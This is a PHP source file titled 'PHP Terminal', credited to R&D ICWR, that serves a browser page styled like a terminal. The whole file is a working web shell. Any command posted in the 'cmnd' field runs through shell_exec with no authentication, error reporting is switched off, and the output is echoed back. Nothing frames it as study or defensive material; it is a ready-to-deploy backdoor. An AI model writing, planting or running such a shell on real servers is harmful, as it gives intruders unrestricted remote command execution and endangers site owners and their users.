<?php

// Copyright (c)2022 - R&D ICWR - Afrizal F.A
// PHP Terminal

error_reporting(0);
session_start();

class terminal
{

    public function change_dir($cmd)
    {

        chdir(str_replace($_SERVER['PHP_SELF'], "", $_SERVER['SCRIPT_FILENAME']));
        $path = explode(" ", $cmd);

        if ($path[0] === "cd") {

            if (is_dir($path[1])) {

                $_SESSION['directory'] = $path[1];

            } else {

                $_SESSION['directory'] = getcwd();

            }

        }

    }

    public function user()
    {

        return get_current_user();

    }

    public function exe($cmd)
    {

        chdir($_SESSION['directory']);

        $check = explode(" ", $cmd);

        if ($cmd === "cd") {

            $_SESSION['directory'] = str_replace($_SERVER['PHP_SELF'], "", $_SERVER['SCRIPT_FILENAME']);

        } else if ($check[0] === "cd") {

            $this->change_dir(str_replace(".", "", $cmd));

        } else if ($result = shell_exec($cmd)) {

            return htmlspecialchars($result);

        } else {

            return htmlspecialchars($cmd) . ": command not found";

        }

    }

    public function term()
    {

        if (empty($_SESSION['directory'])) {

            $_SESSION['directory'] = getcwd();

        }

        return $this->user() . "@" . gethostname() . ":" . $_SESSION['directory'] . " $ ";

    }

    public function sessionCMD($cmd)
    {

        if (!empty($_SESSION['stdout'])) {

            if ($cmd === "clear") {

                unset($_SESSION['stdout']);
    
            } else {

                $stdout = "\t\t" . $this->term() . $cmd . "\n\t\t<pre>" . $this->exe($cmd) . "\t\t</pre>\n";
                $_SESSION['stdout'] .= $stdout;

            }

        } else {

            $stdout = $this->term() . $cmd . "\n\t\t<pre>" . $this->exe($cmd) . "\t\t</pre>\n";
            $_SESSION['stdout'] = $stdout;

        }

    }

}

$functionShellCMD = New terminal();

if (isset($_POST['cmnd'])) {
    
    $functionShellCMD->sessionCMD($_POST['cmnd']);

}
?>
<!DOCTYPE html>
<html>

<head>

    <title>R&D ICWR - Terminal</title>
    <!-- <meta name="viewport" content="width=device-width, initial-scale=1.0" /> -->

    <style>

        * {

            background: black;
            color: lime;

        }

        body {

            margin: 0 auto;
            padding: 10px;

        }

        input, input:hover, input:focus, input:active {

            background: transparent;
            border: 0;
            border-style: none;
            border-color: transparent;
            outline: none;
            outline-offset: 0;
            box-shadow: none;

        }

        pre {

            white-space: pre-wrap;
            word-break: break-word;

        }

        .res {

            overflow: auto;

        }

    </style>
</head>

<body>

    <div class="res">
        <?php if (!empty($_SESSION['stdout'])) { echo($_SESSION['stdout']); } ?>
    </div>

    <form enctype="multipart/form-data" method="post">
        <?php echo($functionShellCMD->term()); ?><input type="text" autofocus="autofocus" onfocus="this.select()" name="cmnd">
    </form>

    <script>

        window.scrollTo(0, document.body.scrollHeight);

    </script>

</body>

</html>
